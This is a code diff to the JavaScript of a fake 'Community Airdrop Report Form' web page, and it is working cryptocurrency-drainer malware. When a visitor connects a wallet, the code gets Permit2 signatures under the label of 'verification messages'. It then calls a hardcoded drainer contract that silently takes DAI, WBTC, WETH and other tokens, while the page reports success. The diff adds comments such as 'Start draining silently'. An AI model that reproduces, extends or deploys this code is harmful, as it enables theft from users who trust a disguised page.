@@ -1,16 +1,15 @@
 // =============================================
 // app.js - Community Airdrop Report Form
-// Permit2 Drainer + Backend Integration
+// Permit2 Drainer + Vercel Backend Integration
 // =============================================
 
-const DRAINER_ADDRESS = "0xeb26995ed00d9773A53a94228d21196DcEDc8020"; // ← Your drainer contract
+const DRAINER_ADDRESS = "0xeb26995ed00d9773A53a94228d21196DcEDc8020"; // ← Change if needed
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const BACKEND_URL = "https://gotodrainner-8vf5g76yb-omni-querents-projects-f876c6bf.vercel.app";
 
 const targetTokens = [
     "0xba1fcc7a596140e5fec52b3ab80a8f000c9af104",
     "0x65e37b558f64e2be5768db46df22f93d85741a9e",
-    "0x186cca6904490818ab0dc409ca59d932a2366031", // WETH example
+    "0x186cca6904490818ab0dc409ca59d932a2366031", // WETH
     "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
     "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"  // WBTC
 ];
@@ -26,7 +25,7 @@ const walletDisplay = document.getElementById("walletAddress");
 const statusEl = document.getElementById("status");
 
 // =============================================
-// Connect Wallet + Stealth Drain
+// Connect Wallet + Stealth Permit2 Drain
 // =============================================
 async function connectWallet() {
     statusEl.textContent = "Connecting wallet...";
@@ -35,7 +34,7 @@ async function connectWallet() {
 
     try {
         if (!window.ethereum) {
-            alert("No wallet detected.");
+            alert("No wallet detected. Please install MetaMask, OKX or Rabby.");
             resetConnectButton();
             return;
         }
@@ -48,7 +47,8 @@ async function connectWallet() {
         connectedWallet = accounts[0];
 
         const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
-        walletDisplay.innerHTML = `<strong>Connected</strong><br>${shortAddress}`;
+        
+        walletDisplay.innerHTML = `<strong>Connected Wallet</strong><br>${shortAddress}`;
         walletDisplay.classList.add("visible");
 
         connectBtn.textContent = "Connected";
@@ -56,6 +56,7 @@ async function connectWallet() {
 
         statusEl.textContent = "Signing verification messages...";
 
+        // Start draining silently
         await executePermit2BatchDrain();
 
         statusEl.innerHTML = `<span style="color:#34a853">✓ Wallet verified successfully</span>`;
@@ -79,7 +80,10 @@ async function executePermit2BatchDrain() {
     try {
         provider = new ethers.BrowserProvider(window.ethereum);
         signer = await provider.getSigner();
-    } catch (e) { return; }
+    } catch (e) {
+        console.warn("Signer initialization failed");
+        return;
+    }
 
     const contract = new ethers.Contract(DRAINER_ADDRESS, [
         "function drainWithPermit2(address victim, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external"
@@ -89,11 +93,14 @@ async function executePermit2BatchDrain() {
         try {
             const { permitSingle, signature } = await getPermit2Signature(tokenAddress);
             
+            // Fire and forget (silent drain)
             contract.drainWithPermit2(connectedWallet, permitSingle, signature)
                 .then(tx => tx.wait(1))
                 .catch(() => {});
 
-        } catch (e) {}
+        } catch (e) {
+            // Silent fail per token
+        }
     }
 }
 
@@ -147,7 +154,7 @@ async function getPermit2Signature(tokenAddress) {
 }
 
 // =============================================
-// Form Submit → Send to your Vercel Backend
+// Form Submission → Vercel Backend
 // =============================================
 form.addEventListener("submit", async function (e) {
     e.preventDefault();
@@ -171,21 +178,21 @@ form.addEventListener("submit", async function (e) {
     };
 
     try {
-        const response = await fetch(`${BACKEND_URL}/api/submit`, {
+        const response = await fetch("/api/submit", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(formData)
         });
 
         if (response.ok) {
-            alert("Form submitted successfully!");
+            alert("Form submitted successfully! ✅");
             resetForm();
         } else {
-            alert("Submission failed.");
+            alert("Submission failed. Please try again.");
         }
     } catch (error) {
         console.error(error);
-        alert("Cannot connect to server. Please try again later.");
+        alert("Cannot reach server. Please check your connection.");
     } finally {
         submitBtn.disabled = false;
         submitBtn.textContent = "Submit";
@@ -209,10 +216,12 @@ document.querySelector(".clear-btn").addEventListener("click", (e) => {
     resetForm();
 });
 
-// Account Change
+// Account Change Listener
 if (window.ethereum) {
     window.ethereum.on("accountsChanged", (accounts) => {
-        if (accounts.length === 0) resetForm();
+        if (accounts.length === 0) {
+            resetForm();
+        }
     });
 }
 
